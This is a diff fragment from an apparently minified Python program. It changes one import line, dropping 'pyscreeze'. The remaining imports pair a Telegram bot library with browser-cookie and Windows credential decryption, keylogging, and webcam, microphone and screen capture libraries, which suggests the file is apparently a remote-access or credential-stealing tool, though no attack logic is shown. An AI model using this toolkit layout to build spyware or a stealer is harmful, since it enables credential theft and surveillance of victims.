@@ -135,7 +135,7 @@ _D='volumeup'
 _C=False
 _B='rb'
 _A=True
-import telebot,os,random,pyttsx3,pyautogui,cv2,json,ctypes,base64,sqlite3,win32crypt,pyscreeze
+import telebot,os,random,pyttsx3,pyautogui,cv2,json,ctypes,base64,sqlite3,win32crypt
 from Cryptodome.Cipher import AES
 import time,stat,pyaudio,wave,browser_cookie3,numpy as np,shutil
 from pynput import keyboard
